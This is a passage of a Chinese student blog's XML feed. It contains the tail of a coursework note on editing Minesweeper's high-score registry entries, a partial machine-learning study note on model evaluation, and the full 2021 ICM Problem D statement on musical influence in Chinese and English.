src="/2021/03/03/%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E4%B9%8B%E6%89%AB%E9%9B%B7-%E4%B8%80-%E4%BF%AE%E6%94%B9%E6%89%AB%E9%9B%B7%E6%88%90%E7%BB%A9/7.png" width="400" height="101"></div><p>&emsp;&emsp;使用Win+R打开电脑运行，输入regedit打开注册表。</p><div align="center"><img src="/2021/03/03/%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E4%B9%8B%E6%89%AB%E9%9B%B7-%E4%B8%80-%E4%BF%AE%E6%94%B9%E6%89%AB%E9%9B%B7%E6%88%90%E7%BB%A9/8.png" width="300" height="155"></div><p>&emsp;&emsp;在HKEY_CURRENT_USER下寻找路径software\Microsoft\winmine，找到英雄榜相关信息如下：</p><div align="center"><img src="/2021/03/03/%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E4%B9%8B%E6%89%AB%E9%9B%B7-%E4%B8%80-%E4%BF%AE%E6%94%B9%E6%89%AB%E9%9B%B7%E6%88%90%E7%BB%A9/9.png"></div>&emsp;&emsp;可以看到Name、Time字段，Name都是匿名，Time都是999，与之前看到的英雄榜数据相同，接下来修改相应字段即可。修改后打开扫雷，查看英雄榜，可见信息已经被修改。<div align="center"><img src="/2021/03/03/%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91%E4%B9%8B%E6%89%AB%E9%9B%B7-%E4%B8%80-%E4%BF%AE%E6%94%B9%E6%89%AB%E9%9B%B7%E6%88%90%E7%BB%A9/10.png" width="250" height="135"></div>]]></content>
    
    
    <summary type="html">&lt;p&gt;大三上学期学过软件安全，接触了一点软件逆向知识，大三下学期选择了软件逆向分析课程来深入学习。第一节课老师便让我们逆向分析扫雷(winmine.exe)，因此做下记录。&lt;br&gt;</summary>
    
    
    
    <category term="学习笔记" scheme="https://yiwenzhe.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="软件逆向" scheme="https://yiwenzhe.com/tags/%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>机器学习笔记(一)：模型评估与选择</title>
    <link href="https://yiwenzhe.com/2021/02/13/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%B8%80-%EF%BC%9A%E6%A8%A1%E5%9E%8B%E8%AF%84%E4%BC%B0%E4%B8%8E%E9%80%89%E6%8B%A9/"/>
    <id>https://yiwenzhe.com/2021/02/13/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%B8%80-%EF%BC%9A%E6%A8%A1%E5%9E%8B%E8%AF%84%E4%BC%B0%E4%B8%8E%E9%80%89%E6%8B%A9/</id>
    <published>2021-02-13T09:38:20.000Z</published>
    <updated>2022-10-20T03:38:39.757Z</updated>
    
    <content type="html"><![CDATA[<!-- excerpt --><br><!-- toc --></p><h1 id="经验误差与过拟合"><a href="#经验误差与过拟合" class="headerlink" title="经验误差与过拟合"></a>经验误差与过拟合</h1><p>&emsp;&emsp;<strong>错误率</strong>：分类错误的样本数占样本总数的比例。m个样本中有a个样本分类错误，则错误率E=a/m。<br>&emsp;&emsp;<strong>精度</strong>：分类正确的样本数占样本总数的比例。精度=1-错误率。<br>&emsp;&emsp;<strong>误差</strong>：学习器实际预测的输出与样本的真实输出之间的差异。训练集上的误差称为“训练误差”或“经验误差”，在新样本上的误差称为“泛化误差”。<br>&emsp;&emsp;<strong>过拟合</strong>：把训练样本自身的一些特点当做所有样本的一般性质，泛化性能下降。<br>&emsp;&emsp;<strong>欠拟合</strong>：对训练样本的一般性质尚未学好，学习能力过低。</p><p><center><img src="/2021/02/13/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%B8%80-%EF%BC%9A%E6%A8%A1%E5%9E%8B%E8%AF%84%E4%BC%B0%E4%B8%8E%E9%80%89%E6%8B%A9/leaf.png"></center><br>&emsp;&emsp;我们的目标是在新样本上表现好的学习器，即泛化误差小。当学习器把训练样本学的太好时，可能会出现过拟合情况。欠拟合比较容易客服，如增加训练轮数等，而过拟合是无法彻底避免的，只能缓解或者说减小其风险。<br>&emsp;&emsp;面对具体任务时，往往有多种算法可供选择，以及不同的参数配置。选择算法、配置参数的过程就叫做“模型选择”。理想的解决方案是对候选模型的泛化误差进行评估，选择泛化误差最小的模型。</p><h1 id="评估方法"><a href="#评估方法" class="headerlink" title="评估方法"></a>评估方法</h1><p>&emsp;&emsp;<strong>训练集</strong>：用来训练学习器的数据集。<br>&emsp;&emsp;<strong>测试集</strong>：用来测试学习器对新样本判别能力的数据集。在测试集上的“测试误差”将作为泛化误差的近似。测试集应尽可能与训练集互斥。<br>&emsp;&emsp;现有包含m个样例的数据集D={(x<sub>1</sub>,y<sub>1</sub>), (x<sub>2</sub>,y<sub>2</sub>), …, (x<sub>m</sub>,y<sub>m</sub>)}，既要训练又要测试，将D分为训练集S和测试T。</p><h2 id="留出法"><a href="#留出法" class="headerlink" title="留出法"></a>留出法</h2><h2 id="交叉验证法"><a href="#交叉验证法" class="headerlink" title="交叉验证法"></a>交叉验证法</h2><h2 id="自助法"><a href="#自助法" class="headerlink" title="自助法"></a>自助法</h2><h1 id="性能度量"><a href="#性能度量" class="headerlink" title="性能度量"></a>性能度量</h1><h1 id="比较检验"><a href="#比较检验" class="headerlink" title="比较检验"></a>比较检验</h1><h1 id="偏差与方差"><a href="#偏差与方差" class="headerlink" title="偏差与方差"></a>偏差与方差</h1>]]></content>
    
    
    <summary type="html">&lt;p&gt;周志华《机器学习》学习笔记：第2章 模型评估与选择&lt;br&gt;</summary>
    
    
    
    <category term="学习笔记" scheme="https://yiwenzhe.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="机器学习" scheme="https://yiwenzhe.com/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>2021美赛D题</title>
    <link href="https://yiwenzhe.com/2021/02/12/2021%E7%BE%8E%E8%B5%9BD%E9%A2%98/"/>
    <id>https://yiwenzhe.com/2021/02/12/2021%E7%BE%8E%E8%B5%9BD%E9%A2%98/</id>
    <published>2021-02-12T10:01:35.000Z</published>
    <updated>2021-07-18T11:31:41.081Z</updated>
    
    <content type="html"><![CDATA[<!-- excerpt --><br><!-- toc --></p><h1 id="中文翻译："><a href="#中文翻译：" class="headerlink" title="中文翻译："></a>中文翻译：</h1><p><strong>问题D：音乐的影响</strong></p><p>自古以来，音乐就已成为人类社会的一部分，已成为文化遗产的重要组成部分。为了理解音乐在人类集体经验中所扮演的角色，我们被要求开发一种量化音乐发展的方法。在创作新音乐时，有许多因素会影响艺术家，包括其天赋的创造力，当前的社会或政治事件，使用新乐器或工具的机会或其他个人经历。我们的目标是了解和衡量先前制作的音乐对新音乐和音乐艺术家的影响。</p><p>一些艺术家可以列出十几个或更多他们认为对自己的音乐作品有影响的艺术家。还建议可以通过歌曲特征（例如结构，节奏或歌词）之间的相似程度来衡量影响力。音乐有时会发生革命性的变化，提供新的声音或节奏，例如何时出现新的流派，或者对现有流派（例如古典，流行/摇滚，爵士等）进行重新发明。这可能是由于一系列小变化，艺术家的合作努力，一系列有影响力的艺术家或社会内部的变化所致。</p><p>许多歌曲具有相似的声音，许多艺术家为音乐类型的重大转变做出了贡献。有时，这些变化是由于一位艺术家影响了另一位艺术家。有时，这是对外部事件（例如重大世界事件或技术进步）的响应而出现的变化。通过考虑歌曲的网络及其音乐特征，我们可以开始捕捉音乐艺术家之间的相互影响。而且，也许，我们还可以更好地了解音乐随着时间的流逝在整个社会中的发展。</p><p>集成集体音乐协会（ICM）指定了您的团队，来开发一种衡量音乐影响力的模型。这个问题要求您探求艺术家和流派的进化和革命趋势。为此，ICM为您的团队提供了一些数据集：</p><ol><li>“influence_data”代表艺术家自己报告的音乐影响者和追随者，以及行业专家的意见。这些数据包含过去90年中5,854位艺术家的影响者和关注者。</li><li><p>“full_music_data”提供了16个变量项，包括音乐特征（如舞蹈性，速度，响度和音律），以及98,340首歌曲中的每一个的artist_name（艺术家名字）和artist_id（艺术家id）。这些数据用于创建两个摘要数据集，包括：</p><p>a.按照艺术家的平均值“data_by_artist”<br>b.按照年份的平均值“data_by_year”</p></li></ol><p><strong>注意：这些文件中提供的数据是较大数据集的子集。这些文件包含您应为该问题使用的唯一数据。</strong></p><p>为了执行这个具有挑战性的项目，ICM协会要求您的团队通过以下措施，通过音乐艺术家随时间的影响来探索音乐的发展：</p><ul><li><p>使用influence_data数据集或其中的一部分来创建音乐影响力的（多个）定向网络，将影响者连接到追随者。开发可捕获此网络中“音乐影响力”的参数。通过创建定向影响者网络的子网来探索音乐影响力的子集。描述此子网。您的“音乐影响力”措施在此子网络中体现了什么？</p></li><li><p>使用音乐特征的full_music_data和/或两个摘要数据集（包括艺术家和年份）来制定音乐相似度的度量。使用您的度量，流派内的艺术家是否比流派间的艺术家更相似？</p></li><li><p>比较流派之间和流派之间的相似性和影响。什么是流派的区别，流派如何随时间变化？有些类型与其他类型有关吗？</p></li><li><p>指示data_influence数据集中报告的相似性数据是否表明所标识的影响者实际上在影响相应的艺术家。 “影响者”实际上会影响追随者创作的音乐吗？是某些音乐特征比其他音乐特征更具“感染力”，或者它们在影响特定艺术家的音乐方面起着相似的作用？</p></li><li><p>从这些数据中确定是否存在可能标志着音乐发展中的革命（重大飞跃）的特征？在您的网络中，哪些艺术家代表着革命者（重大变革的影响者）？</p></li><li><p>分析一种类型音乐随时间变化的影响过程。您的团队能否确定能揭示动态影响者的指标，并解释流派或艺术家随时间的变化？</p></li><li><p>您的作品如何表达有关音乐在时间或环境方面的文化影响的信息？或者，如何在网络中识别社会，政治或技术变化（例如互联网）的影响？</p></li></ul><p>向ICM协会写一份一页纸的文件，说明使用您的方法通过网络理解音乐影响的价值。考虑到这两个问题数据集仅限于某些类型，然后又针对这两个数据集共有的艺术家，您的作品或解决方案将如何随着更多或更丰富的数据而发生变化？建议进一步研究音乐及其对文化的影响。</p><p>来自音乐，历史，社会科学，技术和数学领域的跨学科，多元化的ICM协会期待您的最终报告。</p><p>您的PDF解决方案（总共不超过25页）应包括：</p><ul><li>一页的摘要表。</li><li>目录。</li><li>您的完整解决方案。</li><li>对ICM协会的一页文件。</li><li>参考文献清单。</li></ul><p><strong>注意：2021年的新要求！现在，ICM竞赛限制为25页。提交的所有方面均计为25页的限制：摘要表，目录，解决方案主体，图像和表格，一页文档，参考列表和任何附录。</strong></p><p><strong>附件</strong><br>针对此问题，我们提供了以下四个数据文件。提供的数据文件包含您应用于此问题的唯一数据。</p><ol><li>influence_data.csv</li><li>full_music_data.csv</li><li>data_by_artist.csv</li><li>data_by_year.csv</li></ol><p><strong>数据描述</strong></p><ol><li><p><strong>influence_data.csv</strong>（数据以utf-8编码，以允许处理特殊字符）</p><ul><li><strong>influence_id</strong>：给列出为影响者的人的唯一编号。 （数字字符串）</li><li><strong>influence_name</strong>：影响者的名称，由关注者或行业专家提供。 （串）</li><li><strong>influence_main_genre</strong>：最能描述有影响力的艺术家创作的大部分音乐的流派。 （如果有）（字符串）</li><li><strong>influence_active_start</strong>：影响力艺术家开始其音乐事业的十年。 （整数）</li><li><strong>follower_id</strong>：提供给列出为关注者的艺术家的唯一编号。 （数字字符串）</li><li><strong>follower_name</strong>：跟随有影响力的艺术家的艺术家的名字。 （串）</li><li><strong>follower_main_genre</strong>：最能描述以下艺术家创作的大部分音乐的流派。 （如果有）（字符串）</li><li><strong>follower_active_start</strong>：以下艺术家开始音乐生涯的十年。 （整数）</li></ul></li><li><p><strong>full_music_data.csv</strong> </p></li><li><strong>data_by_artist.csv</strong></li><li><strong>data_by_year.csv</strong></li></ol><p>“full_music_data”, “data_by_artist”, “data_by_year”三个表中的音乐特征：</p><ul><li>artist_name: 创造歌曲的艺术家。（数组）</li><li>artist_id: 和influence_data.csv文件中相同的艺术家唯一编号。 （数字字符串）</li></ul><p><strong>音乐特征：</strong></p><ul><li>danceability: 根据节奏，节奏稳定性，拍子强度和整体规律性等音乐元素的组合来衡量轨道适合跳舞的方式。值0.0为最低可跳舞能力，而1.0为最高可跳舞能力。 （浮点数）</li><li>energy: 表示对强度和活动的感知的量度。值0.0为最小强度/能量，而1.0为强度最大/能量。通常，充满活力的曲目会让人感到快速，响亮且嘈杂。例如，死亡金属具有较高的能量，而巴赫前奏的得分则较低。有助于此属性的感知特征包括动态范围，感知的响度，音色，发作率和一般熵。 （浮点数）</li><li>valence: 一种描述曲目传达的音乐积极性的量度。值0.0最消极，1.0最积极。价态高的音轨听起来更积极（例如，快乐，开朗，欣快），而价态低的音轨听起来更负面（例如，悲伤，沮丧，愤怒）。 （浮点数）</li><li>tempo: 曲目的总体估计拍速，以每分钟拍数（BPM）为单位。用音乐术语来说，节奏是指给定乐曲的速度或节奏，它直接来自平均拍子持续时间。 （浮点数）</li><li>loudness: 轨道的整体响度，以分贝（dB）为单位。值的典型范围是-60至0 db。响度值是整个轨道的平均值，可用于比较轨道的相对响度。响度是声音的质量，它是身体力量（振幅）的主要心理关联。 （浮点数）</li><li>mode: 音轨的模态（主要或次要）的指示，其旋律内容所源自的音阶类型。 Major用1表示，minor用0表示。</li><li>key: 曲目的估计总体密钥。整数使用标准音高类别符号映射到音高。例如。 0 = C，1 =C♯/ D♭，2 = D，依此类推。如果未检测到密钥，则密钥的值为-1。 （整数）</li></ul><p><strong>人声类型</strong></p><ul><li>acousticness: 磁道是否是声学的置信度度量（不增强技术或增强电性能）。值1.0表示轨道是声学的高置信度。 （浮点数）</li><li>instrumentalness: 预测曲目是否不包含人声。在这种情况下，“哦”和“啊”的声音被视为乐器。说唱或口语单词轨迹显然是“声音”。器乐性值越接近1.0，则曲目中没有人声内容的可能性越大。高于0.5的值旨在表示乐器音轨，但随着该值接近1.0，置信度更高。 （浮点数）</li><li>liveness: 检测曲目中观众的存在。较高的活跃度值表示增加了实时执行轨道的可能性。高于0.8的值很可能会显示该轨道处于活动状态。 （浮点数）</li><li>speechiness: 检测曲目中口语的存在。与录音类似的语音内容（例如脱口秀，有声读物，诗歌）越多，属性值就越接近1.0。大于0.66的值描述的曲目可能完全由口语组成。介于0.33到0.66之间的值描述了可能同时包含音乐和语音的曲目，无论是分段还是分层的（包括说唱音乐）。低于0.33的值最有可能代表音乐和其他非语音类曲目。 （浮点数）</li><li>explicit: 检测曲目中的脏话（true（1）=有； false（0）= 没有，或者未知）。 （布尔值）</li></ul><p><strong>描述</strong></p><ul><li>duration_ms: 轨道的持续时间（以毫秒为单位）。 （整数）</li><li>popularity: 这首歌的受欢迎程度。该值将在0到100之间，其中100是最受欢迎的值。受欢迎程度是通过算法计算的，并且在很大程度上取决于音轨的总播放次数以及这些播放的最近时间。一般而言，现在播放频率更高的歌曲将比过去播放频率更高的歌曲具有更高的知名度。重复曲目（例如，同一首曲目和一张专辑中的同一曲目）将被独立评估。艺术家和专辑的流行度是从曲目流行度中数学得出的。 （整数）</li><li>year: 发行曲目的年份。 （1921年至2020年的整数）</li><li>release_date: 曲目发布的日历日期，大多数采用yyyy-mm-dd格式，但是日期的精度可能会有所不同，有些只是以yyyy给出。</li><li>song_title (censored): 曲目的名称。 （字符串）已运行软件以删除歌曲标题中的任何潜在脏话单词。</li><li>count: full_music_data.csv文件中表示特定艺术家的歌曲数。 （整数）</li></ul><h1 id="英文原文："><a href="#英文原文：" class="headerlink" title="英文原文："></a>英文原文：</h1><p><strong>2021 ICM<br>Problem D: The Influence of Music</strong></p><p>Music has been part of human societies since the beginning of time as an essential component of cultural heritage. As part of an effort to understand the role music has played in the collective human experience, we have been asked to develop a method to quantify musical evolution. There are many factors that can influence artists when they create a new piece of music, including their innate ingenuity, current social or political events, access to new instruments or tools, or other personal experiences. Our goal is to understand and measure the influence of previously produced music on new music and musical artists.</p><p>Some artists can list a dozen or more other artists who they say influenced their own musical work. It has also been suggested that influence can be measured by the degree of similarity between song characteristics, such as structure, rhythm, or lyrics. There are sometimes revolutionary shifts in music, offering new sounds or tempos, such as when a new genre emerges, or there is a reinvention of an existing genre (e.g. classical, pop/rock, jazz, etc.). This can be due to a sequence of small changes, a cooperative effort of artists, a series of influential artists, or a shift within society.</p><p>Many songs have similar sounds, and many artists have contributed to major shifts in a musical genre. Sometimes these shifts are due to one artist influencing another. Sometimes it is a change that emerges in response to external events (such as major world events or technological advances). By considering networks of songs and their musical characteristics, we can begin to capture the influence that musical artists have on each other. And, perhaps, we can also gain a better understanding of how music evolves through societies over time.</p><p>Your team has been identified by the <strong>Integrative Collective Music (ICM) Society</strong> to develop a model that measures musical influence. This problem asks you to examine evolutionary and revolutionary trends of artists and genres. To do this, your team has been given several data sets by the ICM:<br>1) “influence_data” represents musical influencers and followers, as reported by the artists themselves, as well as the opinions of industry experts. These data contains influencers and followers for 5,854 artists in the last 90 years.<br>2) “full_music_data” provides 16 variable entries, including musical features such as danceability, tempo, loudness, and key, along with artist_name and artist_id for each of 98,340 songs. These data are used to create two summary data sets, including:<br>    a. mean values by artist “data_by_artist”,<br>    b. means across years “data_by_year”.</p><p><strong>Note:</strong> DATA provided in these files are a subset of larger data sets. These files <strong>CONTAIN THE ONLY DATA YOU SHOULD USE FOR THIS PROBLEM</strong>.</p><p>To carry out this challenging project, the ICM Society asks your teams to explore the evolution of music through the influence across musical artists over time, by doing the following:</p><ul><li>Use the <em>influence_data</em> data set or portions of it to create a (multiple) directed network(s) of musical influence, where influencers are connected to followers. Develop parameters that capture ‘<em>music influence</em>’ in this network. Explore a subset of musical influence by creating a subnetwork of your directed influencer network. Describe this subnetwork. What do your ‘music influence’ measures reveal in this subnetwork?</li><li>Use <em>full_music_data</em> and/or the two summary data sets (with artists and years) of music characteristics, to develop measures of music similarity. Using your measure, are artists within genre more similar than artists between genres?</li><li>Compare similarities and influences between and within genres. What distinguishes a genre and how do genres change over time? Are some genres related to others?</li><li>Indicate whether the similarity data, as reported in the data_influence data set, suggest that the identified influencers in fact influence the respective artists. Do the ‘influencers’ actually affect the music created by the followers? Are some music characteristics more ‘contagious’ than others, or do they all have similar roles in influencing a particular artist’s music?</li><li>Identify if there are characteristics that might signify revolutions (major leaps) in musical evolution from these data? What artists represent revolutionaries (influencers of major change) in your network?</li><li>Analyze the influence processes of musical evolution that occurred over time in one genre. Can your team identify indicators that reveal the dynamic influencers, and explain how the genre(s) or artist(s) changed over time?</li><li>How does your work express information about cultural influence of music in time or circumstances? Alternatively, how can the effects of social, political or technological changes (such as the internet) be identified within the network?</li></ul><p>Write a <strong>one-page document</strong> to the ICM Society about the value of using your approach to understanding the influence of music through networks. Considering the two problem data sets were limited to only some genres, and subsequently to those artists common to both data sets, how would your work or solutions change with more or richer data? Recommend further study of music and its effect on culture.</p><p>The ICM Society, an interdisciplinary and diverse group from the fields of music, history, social science, technology, and mathematics, looks forward to your final report.</p><p>Your PDF solution of no more than 25 total pages should include:</p><ul><li>One-page Summary Sheet.</li><li>Table of Contents.</li><li>Your complete solution.</li><li>One-page document to ICM society.</li><li>References list.</li></ul><p><strong>Note: New for 2021!</strong> The ICM Contest now has a <strong>25-page limit</strong>. All aspects of your submission count toward the 25-page limit: Summary Sheet, Table of Contents, Main Body of Solution, Images and Tables, One-page Document, Reference List, and any Appendices.</p><p><strong>Attachments</strong><br>We provide the following four data files for this problem. THE DATA FILES PROVIDED CONTAIN THE ONLY DATA YOU SHOULD USE FOR THIS PROBLEM.</p><ol><li><strong>influence_data.csv</strong></li><li><strong>full_music_data.csv</strong></li><li><strong>data_by_artist.csv</strong></li><li><strong>data_by_year.csv</strong></li></ol><p><strong>Data Descriptions</strong></p><ol><li><strong>influence_data.csv</strong> (Data is encoded in utf-8 to allow for handling of special characters):<ul><li><strong>influencer_id</strong>: A unique identification number given to the person listed as influencer. (string of digits)</li><li><strong>influencer_name</strong>: The name of the influencing artist as given by the follower or industry experts. (string)</li><li><strong>influencer_main_genre</strong>: The genre that best describes the bulk of the music produced by the influencing artist. (if available) (string)</li><li><strong>influencer_active_start</strong>: The decade that the influencing artist began their music career. (integer)</li><li><strong>follower_id</strong>: A unique identification number given to the artist listed as follower. (string of digits)</li><li><strong>follower_name</strong>: The name of the artist following an influencing artist. (string)</li><li><strong>follower_main_genre</strong>: The genre that best describes the bulk of the music produced by the following artist. (if available) (string)</li><li><strong>follower_active_start</strong>: The decade that the following artist began their music career. (integer)</li></ul></li><li><strong>full_music_data.csv</strong></li><li><strong>data_by_artist.csv</strong></li><li><strong>data_by_year.csv</strong></li></ol><p>Spotify audio features from the “<strong>full_music_data</strong>”, “<strong>data_by_artist</strong>”, “<strong>data_by_year</strong>”:</p><ul><li><strong>artist_name</strong>: The artist who performed the track. (array)</li><li><strong>artist_id</strong>: The same unique identification number given in the influence_data.csv file. (string of digits)</li></ul><p><strong>Characteristics of the music:</strong></p><ul><li><strong>danceability</strong>: A measure of how suitable a track is for dancing based on a combination of musical elements including tempo, rhythm stability, beat strength, and overall regularity. A value of 0.0 is least danceable and 1.0 is most danceable. (float)</li><li><strong>energy</strong>: A measure representing a perception of intensity and activity. A value of 0.0 is least intense/energetic and 1.0 is most intense/energetic. Typically, energetic tracks feel fast, loud, and noisy. For example, death metal has high energy, while a Bach prelude scores low on the scale. Perceptual features contributing to this attribute include dynamic range, perceived loudness, timbre, onset rate, and general entropy. (float)</li><li><strong>valence</strong>: A measure describing the musical positiveness conveyed by a track. A value of 0.0 is most negative and 1.0 is most positive. Tracks with high valence sound more positive (e.g. happy, cheerful, euphoric), while tracks with low valence sound more negative (e.g. sad, depressed, angry). (float)</li><li><strong>tempo</strong>: The overall estimated tempo of a track in beats per minute (BPM). In musical terminology, tempo is the speed or pace of a given piece and derives directly from the average beat duration. (float)</li><li><strong>loudness</strong>: The overall loudness of a track in decibels (dB). Values typical range between -60 and 0 db. Loudness values are averaged across the entire track and are useful for comparing relative loudness of tracks. Loudness is the quality of a sound that is the primary psychological correlate of physical strength (amplitude). (float)</li><li><strong>mode</strong>: An indication of modality (major or minor), the type of scale from which its melodic content is derived, of a track. Major is represented by 1 and minor is 0.</li><li><strong>key</strong>: The estimated overall key of the track. Integers map to pitches using standard Pitch Class notation. E.g. 0 = C, 1 = C♯/D♭, 2 = D, and so on. If no key was detected, the value for key is -1. (integer)</li></ul><p><strong>Type of vocals:</strong></p><ul><li><strong>acousticness</strong>: A confidence measure of whether the track is acoustic (without technology enhancements or electrical amplification). A value of 1.0 represents high confidence the track is acoustic. (float)</li><li><strong>instrumentalness</strong>: Predicts whether a track contains no vocals. “Ooh” and “aah” sounds are treated as instrumental in this context. Rap or spoken word tracks are clearly “vocal”. The closer the instrumentalness value is to 1.0, the greater likelihood the track contains no vocal content. Values above 0.5 are intended to represent instrumental tracks, but confidence is higher as the value approaches 1.0. (float)</li><li><strong>liveness</strong>: Detects the presence of an audience in a track. Higher liveness values represent an increased probability that the track was performed live. A value above 0.8 provides strong likelihood that the track is live. (float)</li><li><strong>speechiness</strong>: Detects the presence of spoken words in a track. The more exclusively speech-like the recording (e.g. talk show, audio book, poetry), the closer to 1.0 the attribute value. Values above 0.66 describe tracks that are probably made entirely of spoken words. Values between 0.33 and 0.66 describe tracks that may contain both music and speech, either in sections or layered, including such cases as rap music. Values below 0.33 most likely represent music and other non-speech-like tracks. (float)</li><li><strong>explicit</strong>: Detects explicit lyrics in a track (true (1) = yes it does; false (0) = no it does not OR unknown). (Boolean)`</li></ul><p><strong>Description:</strong></p><ul><li><strong>duration_ms</strong>: The duration of the track in milliseconds. (integer)</li><li><strong>popularity</strong>: The popularity of the track. The value will be between 0 and 100, with 100 being the most popular. The popularity is calculated by algorithm and is based, in the most part, on the total number of plays the track has had and how recent those plays are. Generally speaking, songs that are being played more frequently now will have a higher popularity than songs that were played more frequently in the past. Duplicate tracks (e.g. the same track from a single and an album) are rated independently. Artist and album popularity are derived mathematically from track popularity. (integer)</li><li><strong>year</strong>: The year of release of a track. (integer from 1921 to 2020)</li><li><strong>release_date</strong>: The calendar date of release of a track mostly in yyyy-mm-dd format, however precision of date may vary and some just given as yyyy.</li><li><strong>song_title (censored)</strong>: The name of the track. (string) Software was run to remove any potential explicit words in the song title.</li><li><strong>count</strong>: The number of songs a particular artist is represented in the full_music_data.csv file. (integer)</li></ul><h1 id="D题数据下载："><a href="#D题数据下载：" class="headerlink" title="D题数据下载："></a>D题数据下载：</h1><p><a href="2021_ICM_Problem_D_Data.zip">点击下载</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;2021美赛中文翻译及英文原文。&lt;br&gt;</summary>
    
    
    
    <category term="竞赛" scheme="https://yiwenzhe.com/categories/%E7%AB%9E%E8%B5%9B/"/>
    
    
    <category term="美赛" scheme="https://yiwenzhe.com/tags/%E7%BE%8E%E8%B5%9B/"/>
    
  </entry>
  
</feed>
